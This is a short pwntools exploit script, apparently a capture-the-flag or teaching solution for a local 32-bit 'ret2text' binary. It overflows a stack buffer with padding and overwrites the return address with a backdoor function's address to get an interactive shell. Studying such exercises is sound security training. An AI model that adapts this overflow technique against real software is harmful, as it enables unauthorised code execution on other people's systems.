from pwn import *

sh = process('./ret2text')

# bin_sh_addr = 0x8048763
backdoor_addr = 0x804863A
payload = 'a' * 0x6c + 'bbbb' + p32(backdoor_addr)

sh.sendline(payload)
sh.interactive()